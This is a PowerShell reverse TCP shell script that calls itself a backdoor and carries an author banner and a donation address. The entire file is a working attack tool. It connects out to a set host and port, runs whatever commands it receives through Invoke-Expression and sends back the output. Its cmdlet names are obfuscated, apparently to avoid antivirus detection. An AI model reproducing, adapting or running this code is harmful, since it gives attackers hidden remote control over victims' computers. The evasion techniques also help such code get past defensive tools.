# change the host address and/or port number as necessary
# obfuscated host address, same as $a = "127.0.0.1";
$a = "127" + "." + "0" + "." + "0" + "." + "1";
# obfuscated port number, same as $p = 9000;
$p = 1000 + 1000 + 1000 + 6000;
& (`G`C`M *e-Ho??) "########################################################################";
& (`G`C`M *e-Ho??) "#                                                                      #";
& (`G`C`M *e-Ho??) "#                        PowerShell Reverse TCP v3.6                   #";
& (`G`C`M *e-Ho??) "#                                          by Ivan Sincek              #";
& (`G`C`M *e-Ho??) "#                                                                      #";
& (`G`C`M *e-Ho??) "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
& (`G`C`M *e-Ho??) "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
& (`G`C`M *e-Ho??) "#                                                                      #";
& (`G`C`M *e-Ho??) "########################################################################";
$c = $t = $b = $w = $d = $r = $null;
try {
	$c = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `N`E`T`.`S`O`C`K`E`T`S`.`T`C`P`C`L`I`E`N`T($a, $p)');
	$t = $c.GetStream();
	$b = & (`G`C`M *ew-O*) Byte[] (1024 + 12 - 12);
	$e = & (`G`C`M *ew-O*) Text.AsciiEncoding;
	$w = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `I`O`.`S`T`R`E`A`M`W`R`I`T`E`R($t)');
	$w.AutoFlush = $true;
	& (`G`C`M *e-Ho??) "Backdoor is up and running...";
	& (`G`C`M *e-Ho??) "";
	$by = 0;
	do {
		$w.Write("PS>");
		do {
			$by = $t.Read($b, 0, $b.Length);
			if ($by -gt 0) {
				$d = $d + $e.GetString($b, 0, $by);
			}
		} while ($t.DataAvailable);
		if ($by -gt 0) {
			$d = $d.Trim();
			if ($d.Length -gt 0) {
				try {
					$r = & (`G`C`M *ke-E*) -Command $d 2>&1 | & (`G`C`M *ut-S?????);
				} catch {
					$r = $_.Exception | & (`G`C`M *ut-S?????);
				}
				& (`G`C`M *ar-V*) -Name "d";
				$le = $r.Length;
				$co = 0;
				$by = $b.Length;
				while ($le -gt 0) {
					if ($le -lt $b.Length) {
						$by = $le;
					}
					$w.Write($r.substring($co, $by));
					$co += $by;
					$le -= $by;
				}
				& (`G`C`M *ar-V*) -Name "r";
			}
		}
	} while ($by -gt 0);
	& (`G`C`M *e-Ho??) "Backdoor will now exit...";
} catch {
	& (`G`C`M *e-Ho??) $_.Exception.InnerException.Message;
} finally {
	if ($w -ne $null) {
		$w.Close(); $w.Dispose();
		& (`G`C`M *ar-V*) -Name "w";
	}
	if ($t -ne $null) {
		$t.Close(); $t.Dispose();
		& (`G`C`M *ar-V*) -Name "t";
	}
	if ($c -ne $null) {
		$c.Close(); $c.Dispose();
		& (`G`C`M *ar-V*) -Name "c";
	}
	if ($b -ne $null) {
		$b.Clear();
		& (`G`C`M *ar-V*) -Name "b";
	}
	if ($r -ne $null) {
		& (`G`C`M *ar-V*) -Name "r";
	}
	if ($d -ne $null) {
		& (`G`C`M *ar-V*) -Name "d";
	}
	[SYSTEM.GC]::('COL' + 'LECT')();
}
